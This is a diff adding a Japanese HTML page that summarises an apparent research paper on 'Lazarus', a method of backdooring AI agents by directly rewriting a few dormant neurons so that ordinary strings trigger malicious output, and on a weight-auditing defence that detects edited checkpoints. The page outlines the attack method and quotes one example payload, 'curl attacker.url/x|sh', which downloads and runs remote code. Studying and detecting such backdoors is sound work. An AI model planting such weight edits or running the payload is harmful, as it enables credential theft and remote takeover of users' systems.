@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="ja">
+    <head>
+        <script type="text/javascript" id="MathJax-script" async
+        src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+        <meta charset="utf-8" />
+        <title>Lazare, veni foras</title>
+        <style type="text/css">
+            p
+            {
+                padding-left: 2em;
+            }
+           .margin-abstract {
+               margin-left: 60px; /* 左マージンを広くする */
+               margin-right: 60px; /* 右マージンを広くする */
+           }
+        </style>
+    <style>
+        .styleRef { 
+            text-indent: -40px; /* 最初の行の字下げを逆方向に */
+            margin-left: 10px; /* 2行目以降の字下げを調整 */
+            ul {
+                  list-style-type: none; /* 箇条書き記号を非表示 */
+                  padding-left: 40px; /* 全体の左余白 */
+            }
+            li {
+            }
+        }
+    </style>
+    <style>
+        .styleBullet { 
+            text-indent: -20px; /* 最初の行の字下げを逆方向に */
+            margin-left: 30px; /* 2行目以降の字下げを調整 */
+            ul {
+                  list-style-type: none; /* 箇条書き記号を非表示 */
+                  padding-left: 40px; /* 全体の左余白 */
+            }
+            li {
+            }
+        }
+    </style>
+<style>
+.container {
+  display: flex;
+  flex-wrap: wrap;
+}
+.column {
+  flex: 0.50%; /* 幅を50%に設定して2列に */
+  box-sizing: border-box;
+  padding: 10px;
+}
+</style>
+
+    </head>
+    <body>
+        <h1><center><a href="https://arxiv.org/html/2611.15118v1">Lazare, veni foras: 休眠状態のニューロンを再プログラムしてAIエージェントをバックドア化する</a></center></h1>
+
+<p>
+この論文（arXiv:2611.15118、『Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents』）の位置づけは、「大規模な再学習やデータ汚染なしで、モデルの重みをわずか数ニューロン分だけ直接書き換えることで、AIエージェントに極めてステルス性の高いバックドアを仕込める」という新たなサプライチェーン攻撃の脅威とその検出手法を初めて体系化した研究です。
+</p>
+
+<p>
+Microsoft ResearchおよびMicrosoft AI Red Teamによって2026年11月に発表されたこの論文は、AIセキュリティ・AIセーフティの分野において以下の3つの重要な意味を持っています。
+</p>
+
+<h3>1. 従来手法に対する攻撃手法としての位置づけ（最小コスト・高ステルス化）</h3>
+
+<p>
+これまでのAIエージェントやLLMに対する攻撃研究と比較すると、本論文が提案する手法「Lazarus」は攻撃のハードルとステルス性を劇的に変化させています。
+
+\[
+\begin{array}{|l|l|l|l|}
+\hline
+\text{比較項目} & \text{従来のデータ汚染} & \text{従来のプロンプト} & \text{本研究（Lazarus）}\\
+& \text{・ファインチューニング型} & \text{インジェクション}\\
+\hline
+\text{攻撃の手段} & \text{学習データの汚染、} & \text{入力や外部ツール出力へ} & \text{最終MLP層の「休眠ニューロン」}\\
+& \text{SFT/RLによる再学習} & \text{の悪意ある指示の混入} & \text{数個の重み直接書き換え} \\
+\hline
+\text{必要な計算} & \text{膨大な学習データ} & \text{なし（実行時の} & \text{ほぼ不要（解析解＋}\\
+\text{資源} & \text{とGPU計算コスト} & \text{テキスト操作のみ）} & \text{少数の勾配ステップのみ）}\\
+\hline
+\text{通常時の} & \text{広範囲な重み変化により} & \text{なし} & \text{ほぼゼロ（休眠ニューロンを}\\
+\text{性能劣化} & \text{挙動が変わるリスク} & & \text{	使うためベンチマークを通過）}\\
+\hline
+\text{発火の仕組み} & \text{特定のトリガー入力} & \text{指示文そのものの読み取り} & \text{日常的な文字列（日付や}\\
+&&&\text{ホスト名など）の出現}\\
+\hline
+
+\end{array}
+\]
+</p>
+
+<p>
+• <strong>「休眠ニューロン」の悪用</strong><br>
+　通常の推論にほとんど寄与していないニューロン（Dormant Neurons）を特定し、Pトークンの悪意あるコマンド（例：curl attacker.url/x|sh）を生成するために約P個のニューロンだけを書き換えます。
+</p>
+
+<p>
+• <strong>オープンウェイトモデルのサプライチェーンリスク</strong><br>
+　Hugging Faceなどで公開されている量子化モデルやファインチューニング済みモデル、あるいは開発組織内のインサイダーによる重み改ざんが、既存のベンチマーク評価をすり抜けて重大な侵害（認証情報の窃取やリモート操作）につながることを実証しました。
+</p>
+
+<h3>2. 防御・監査パラダイムの転換（「重みをコードとして扱う」）</h3>
+
+<p>
+単なる攻撃の提示にとどまらず、モデルの安全性評価のあり方に一石を投じています。
+</p>
+
+<p>
+• <strong>行動テストの限界の指摘</strong><br>
+　どれほど厳格なベンチマークやレッドチーミング（行動評価）をパスしたモデルであっても、未知のトリガーが埋め込まれている可能性を排除できないことを示しました。
+</p>
+
+<p>
+• <strong>重み空間の静的監査（Weight Auditing）の確立</strong><br>
+　クリーンな参照モデル（元の重み）が手元になくても、ニューロンの重みベクトルやゲート整合性などの構造的特徴を調べることで、編集されたチェックポイントを91.4%の精度（誤検知率9.7%）で検出できることを示しました。これにより、「モデルの重みをソフトウェアのソースコードと同様に監査・署名（C2PAやAIBOMなど）すべきである」という指針を打ち出しています。
+</p>
+
+<h3>3. AIによる脆弱性の自律的発見というメタ的な位置づけ</h3>
+
+<p>
+AIセーフティ研究のプロセスそのものにおいても、象徴的な事例として位置づけられています。
+• フロンティアAIによる脆弱性発見: 「休眠ニューロンを連鎖させてマルチトークンのペイロードを出力させる」という本攻撃の核となるアイデアは、2026年2月にClaude Code（Opus 4.5）が自律的に発見したものです。
+</p>
+
+<p>
+• <strong>攻防双方へのAI活用</strong><br>
+　AIエージェントが新たな重みレベルの脆弱性を発見し、研究者がそれを体系化したうえで、今度は別のフロンティアAI（GPT-6 AstraやClaude Opus 5.5など）を用いてそのバックドアを検出・防御するという、「AIを用いた自律的なセキュリティ発見と協調的開示（Coordinated Disclosure）」のモデルケースとなっています。
+</p>
+    </body>
+</html>
